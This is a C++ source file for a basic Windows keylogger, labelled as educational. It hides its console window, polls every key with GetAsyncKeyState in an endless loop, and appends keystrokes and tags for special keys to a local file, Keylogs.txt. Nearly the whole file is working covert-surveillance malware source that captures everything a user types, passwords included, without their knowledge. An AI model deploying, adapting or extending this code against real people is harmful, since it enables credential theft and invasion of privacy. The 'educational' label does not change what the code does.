/* This is a very basic Keylogger implementation.
Solely for educational purpose.
*/

#include <iostream>
#include <fstream>
#include <Windows.h>


/* -----------------Write to log Function----------------------------
This function will write our keystroke to a log file : Keylogs.txt
Refernce on fstream :
https://www.tutorialspoint.com/cplusplus/cpp_files_streams.htm
http://www.cplusplus.com/reference/fstream/fstream/open/
*/
void writeToLog(std::string input) {
	std::fstream logfile; // Creates a fstream object named logfile
	logfile.open("Keylogs.txt", std::ios::app); // Using open method we are opening Keylogs.txt in append mode (std::ios::app)
	logfile << input; // Inserting our logs to the logfile 
	logfile.close(); // Closing the file 
}


/* Here we are checking if non-alphabetic keys are pressed. */

bool specialKeys(int sKey) {
	switch (sKey) {

		case VK_SPACE:
			writeToLog(" ");
			return true;
		case VK_RETURN:
			writeToLog("\n");
			return true;
		case VK_SHIFT:
			writeToLog("[SHIFT]");
			return true;
		case VK_BACK:
			writeToLog("[BACKS-PACE]");
			return true;
		case VK_RBUTTON:
			writeToLog("[R_CLICK]");
			return true;
		case VK_CAPITAL:
			writeToLog("[CAPS_LCOK]");
			return true;
		case VK_TAB:
			writeToLog("[TAB]");
			return true;
		case VK_UP:
			writeToLog("[UP_ARROW_KEY]");
			return true;
		case VK_DOWN:
			writeToLog("[DOWN_ARROW_KEY]");
			return true;
		case VK_LEFT:
			writeToLog("[LEFT_ARROW_KEY]");
			return true;
		case VK_RIGHT:
			writeToLog("[RIGHT_ARROW_KEY]");
			return true;
		case VK_CONTROL:
			writeToLog("[CONTROL]");
			return true;
		case VK_MENU:
			writeToLog("[ALT]");
			return true;
		default:
			return false;
	}
}




/* We are using GetAsyncKeyState() API to identify if any keys in the keyboard is pressed.
Reference : https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate
*/
int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE); // Hides the console Window
	while (true) { // Since GetAsyncKeyState Checks individual keys one by one we want it to run throughout via this while(true) 
		Sleep(10); // This 10ms sleep is to make the program consume less memory.
		for (int Key = 8; Key < 128; Key++) { // We are looping through 8 to 127 signed char. Ref : http://www.asciitable.com/
			if (GetAsyncKeyState(Key) == -32767) { // Here we are checking for indivual "Key" state i.e if that particular key is down.
				if (specialKeys(Key) == FALSE) { // If this "Key" is not present in our non-alphabetic key map we are assuming that it is printable ascii and thus appending it to our keylog.
					std::fstream LogFile;
					LogFile.open("Keylogs.txt", std::ios::app);
					if (LogFile.is_open()) {
						LogFile << char(Key);
						LogFile.close();
					}
				}
			}
		}

	}

	return 0;
}